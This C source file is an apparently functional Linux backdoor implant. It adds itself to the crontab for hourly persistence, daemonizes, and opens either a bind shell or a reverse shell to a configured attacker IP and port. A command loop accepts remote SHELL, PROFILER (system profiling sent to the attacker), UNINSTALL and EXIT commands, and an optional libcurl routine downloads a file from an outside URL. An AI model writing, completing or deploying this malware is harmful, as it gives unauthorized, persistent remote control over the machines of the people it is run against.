#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <signal.h>
#include "commands.c"
#define _GNU_SOURCE
#include "valHelper.c"

#define MAXDATASIZE 100
#define SLEEP 5

#define MUTEX "/tmp/alive.txt"

void foo();
void commands(int sockfd);

int main(void) {
      /*==Validating code using valHelper.c==*/
      val_IP();       //Macro: VALID_IP
      val_SysName();  //Macro: VALID_SYSNAME
      val_time();     //Macro: VALID_TIME
      /*=====================================*/
      #ifdef MUTEX
      if(access( MUTEX, F_OK) != 0){
        system("crontab -l | { cat; echo \"0 * * * * /bin/implant\"; } | crontab -");
      }
      else{
        printf("exiting backdoor");
        exit(1);
      }
      #endif
      FILE *fp = NULL;
      fp = fopen("/tmp/alive.txt", "w");
        /* Our process ID and Session ID */
        pid_t pid, sid;

        /* Fork off the parent process */
        pid = fork();
        if (pid < 0) {
                exit(EXIT_FAILURE);
        }
        /* If we got a good PID, then
           we can exit the parent process. */
        if (pid > 0) {
                exit(EXIT_SUCCESS);
        }

        /* Change the file mode mask */
        umask(0);

        /* Open any logs here */

        /* Create a new SID for the child process */
        sid = setsid();
        if (sid < 0) {
                /* Log the failure */
                exit(EXIT_FAILURE);
        }



        /* Change the current working directory */
        if ((chdir("/")) < 0) {
                /* Log the failure */
                exit(EXIT_FAILURE);
        }

        /* Close out the standard file descriptors */
        //close(STDIN_FILENO);
        //close(STDOUT_FILENO);
        //close(STDERR_FILENO);

        /* Daemon-specific initialization goes here */

        /* The Big Loop */
        //while (1) {
           /* Do some task here ... */
           #ifdef BINDSHELL
           foo(); //bindshell code
           //break;
           #endif

           #ifdef REVERSESHELL
           foo(); //reverseshell code
           //break;
           #endif

           //sleep(30); /* wait 30 seconds */
        //}
   remove("/tmp/alive.txt");
   exit(EXIT_SUCCESS);
}

#ifdef BINDSHELL
void sigchld_handler(int s)
{
    // waitpid() might overwrite errno, so we save and restore it:
    int saved_errno = errno;

    while(waitpid(-1, NULL, WNOHANG) > 0);

    errno = saved_errno;
}


// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
#endif
void foo()
{
  #ifdef DEBUG
  //printf("Error occurred!\n");
  if(errno != 0)
    perror("Error blah blah");
  #endif

  #ifdef IPADDR
  printf("IPADDR: %s!\n", IPADDR);
  #endif
  /*
  #ifdef DOMAIN
  printf("DOMAIN: %s!\n", DOMAIN);
  #endif

  #ifdef PLATFORM
  printf("PLATFORM: %s!\n", PLATFORM);
  #endif

  #ifdef ARCH
  printf("ARCH: %s!\n", ARCH);
  #endif*/

  #ifdef OS
  printf("OS: %s!\n", OS);
  #endif
  /*
  #ifdef VERSION_NUM
  printf("VERSION_NUM: %s!\n", VERSION_NUM);
  #endif

  #ifdef PAYLOAD
  printf("PAYLOAD: %s!\n", PAYLOAD);
  #endif

  #ifdef INTERFACE
  printf("INTERFACE: %s!\n", INTERFACE);
  #endif

  #ifdef ACTIVATE
  printf("ACTIVATE: %s!\n", ACTIVATE);
  #endif

  #ifdef SIZE
  printf("SIZE: %s!\n", SIZE);
  #endif

  #ifdef TRIGGER
  printf("TRIGGER: %s!\n", TRIGGER);
  #endif

  #ifdef DELAY
  printf("DELAY: %s!\n", DELAY);
  #endif

  #ifdef DATEDELAY
  printf("DATEDELAY: %s!\n", DATEDELAY);
  #endif

  #ifdef DOWNLOADURL
  printf("DOWNLOADURL: %s!\n", DOWNLOADURL);
  #endif

  #ifdef BANG
  printf("BANG: %d!\n", BANG);
  #endif

  #ifdef LOADSHELLCODE
  printf("LOADSHELLCODE: %d!\n", LOADSHELLCODE);
  #endif
*/
  #ifdef BINDSHELL
  printf("BINDSHELL: %d!\n", BINDSHELL);
  
  //addr.sin_port = htons(atoi(S_PORT));

  int sockfd, new_fd;  // listen on sock_fd, new connection on new_fd
    struct addrinfo hints, *servinfo, *p;
    struct sockaddr_storage their_addr; // connector's address information
    socklen_t sin_size;
    struct sigaction sa;
    int yes=1;
    char s[INET6_ADDRSTRLEN];
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE; // use my IP

    if ((rv = getaddrinfo(NULL, S_PORT, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
    }

    // loop through all the results and bind to the first we can
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype,
                p->ai_protocol)) == -1) {
            perror("server: socket");
            continue;
        }

        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
                sizeof(int)) == -1) {
            perror("setsockopt");
            exit(1);
        }

        if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            perror("server: bind");
            continue;
        }

        break;
    }

    freeaddrinfo(servinfo); // all done with this structure

    if (p == NULL)  {
        fprintf(stderr, "server: failed to bind\n");
        exit(1);
    }

    if (listen(sockfd, 5) == -1) {
        perror("listen");
        exit(1);
    }
    sa.sa_handler = sigchld_handler; // reap all dead processes
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(1);
    }

    printf("server: waiting for connections...\n");

    while(1) {  // main accept() loop
        sin_size = sizeof their_addr;
        new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
        if (new_fd == -1) {
            perror("accept");
            continue;
        }

        inet_ntop(their_addr.ss_family,
            get_in_addr((struct sockaddr *)&their_addr),
            s, sizeof s);
        printf("server: got connection from %s\n", s);

        if (!fork()) { // this is the child process
            close(sockfd); // child doesn't need the listener
            commands(new_fd);

            exit(0);
        }
        close(new_fd);  // parent doesn't need this
    }

  close(sockfd);
  #endif

  #ifdef REVERSESHELL
  const char* ip = S_IP;
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(atoi(S_PORT));
  inet_aton(ip, &addr.sin_addr);

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
  #define COMMANDS 1
  commands(sockfd);
  close(sockfd);
  #endif

  #ifdef REVERSEIP
  printf("REVERSEIP: %s!\n", REVERSEIP);
  #endif

  #ifdef REVERSEPORT
  printf("REVERSEPORT: %s!\n", REVERSEPORT);
  #endif

  #ifdef S_IP
  printf("S_IP: %s!\n", S_IP);
  #endif

  #ifdef S_PORT
  printf("S_PORT: %s!\n", S_PORT);
  #endif
  /*
  #ifdef PERSIST
  printf("PERSIST: %s!\n", PERSIST);
  #endif

  #ifdef NOTES
  printf("NOTES: %s!\n", NOTES);
  #endif
  */
  #ifdef STRIP
  printf("STRIP: %d!\n", STRIP);
  #endif
  /*
  #ifdef STATIC
  printf("STATIC: %d!\n", STATIC);
  #endif
  */
  #ifdef SECIMP
  printf("SECIMP: %d!\n", SECIMP);
  //libcurl program

  //size_t write_data = fwrite(ptr, size, nmemb, (FILE *)stream);

  CURL *curl_handle;
  static const char *pagefilename = "page.jpg";
  FILE *pagefile;

  curl_global_init(CURL_GLOBAL_ALL);
  /* init the curl session */
  curl_handle = curl_easy_init();
  /* set URL to get here */
  curl_easy_setopt(curl_handle, CURLOPT_URL, "https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg");
  /* Switch on full protocol/debug output while testing */
  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
  /* disable progress meter, set to 0L to enable it */
  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
  /* send all data to this function  */
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
  /* open the file */
  pagefile = fopen(pagefilename, "wb");
  if(pagefile) {
    /* write the page body to this file handle */
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
    /* get it! */
    curl_easy_perform(curl_handle);
    /* close the header file */
    fclose(pagefile);
  }
  /* cleanup curl stuff */
  curl_easy_cleanup(curl_handle);
  curl_global_cleanup();

  #endif
}

#ifdef COMMANDS
void commands(int sockfd){
  char buf[MAXDATASIZE];
  int numbytes;
  int endConnect = 0;
  while(endConnect != 1){
    if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
      perror("recv");
      exit(1);
    }
    buf[numbytes] = '\0';
    if(strcmp(buf,"UNINSTALL\n") == 0){
      remove("/tmp/crontab");
      remove("/implant");
      remove(MUTEX);
      exit(0);
      //remove cron, the implant a.out, and then exit() the implant process

      endConnect = 1;
    }
    else if(strstr(buf, "SLEEP") != NULL){
      sleep(SLEEP);
    }
    else if(strcmp(buf,"SHELL\n") == 0){
      shell(sockfd);
    }
    else if(strcmp(buf,"PROFILER\n") == 0){
      struct Profile* prof = getProfile();
      char * strProf = strProfile();
      //char sendbuf;
      //scanf("%s", &sendbuf);
      int sendbufsize = strlen(strProf);
      int sendN = send(sockfd, strProf, sendbufsize, 0);
      //write(sockfd,&strProf,sendbufsize);

      free(strProf);
    }
    else if(strcmp(buf,"EXIT\n") == 0){
      remove(MUTEX);
      kill(getpid(), SIGKILL);
      endConnect = 1;
    }
  }
}
#endif
